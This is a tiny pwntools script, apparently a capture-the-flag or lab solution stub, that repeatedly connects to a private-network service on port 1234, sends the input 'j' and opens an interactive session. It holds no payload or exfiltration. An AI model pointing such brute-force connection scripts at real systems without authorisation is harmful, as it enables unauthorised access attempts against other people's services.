from pwn import *
import os
for i in xrange(0xffffffff):
  s = remote('192.168.0.85',1234)
  s.recvuntil(':')
  s.send('j\n')
  s.recvuntil('?')
  s.interactive()
